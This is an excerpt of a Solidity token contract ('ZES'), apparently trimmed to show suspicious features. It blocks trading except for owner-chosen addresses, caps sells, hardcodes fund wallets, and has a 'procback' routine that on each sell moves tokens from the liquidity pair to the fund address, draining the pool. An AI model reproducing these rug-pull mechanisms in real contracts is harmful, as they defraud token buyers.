...
abstract contract AbsToken is IERC20, Ownable {
    ...
    uint256 public _walletMax = 20 *10**18;
    uint256 public maxGasOfBot = 60 * 10 **8;
    ...
    function _transfer(
        ...
        if((_swapPairList[from] || _swapPairList[to]) && swapstatus == false){
            require( from == receiveAddress || to == receiveAddress|| from == fundAddress || to == fundAddress,"only receiveAddress!||fundAddress");            
        }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (isSell) {
                ...
                uint256 maxSellAmount = balanceOf(sender) * 9999 / 10000;
                if (tAmount > maxSellAmount) {
                tAmount= maxSellAmount;
            }
                procback();
    ...
    function procback() public {
        ...
        if(isNeedProcback()){
            ...
            _takeTransfer(address(_mainPair),fundAddress,eAmount);
            // _mainPair.sync();
        }
    }
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint firstfundamount = fundAmount * 2 / 3;
        uint secfundamount = fundAmount - firstfundamount;
        address secFundAddress = 0x2ef6dB7009fa9Dc8d670A88D766fE6872b139A87;
        address thiFundAddress = 0x2ef6dB7009fa9Dc8d670A88D766fE6872b139A87;
    ...
    function setBotBlacklist(address _botAddress, bool value) external onlyOwner {
        require(isContract(_botAddress), "only contract address, not allowed exteranlly owned account");
        _blackList[_botAddress] = value;
    }
    ...
    function antiBot(address from,address to) public{
        if(!antiBotOpen){
            return;
        }
...
contract ZES is AbsToken {
    constructor() AbsToken(    
        ...
        18,   
        10000,    
        address(0xd4a1425947f3d2D8e8af051801393D65E449021E),    
        address(0x2ef6dB7009fa9Dc8d670A88D766fE6872b139A87)
    ){
    }
}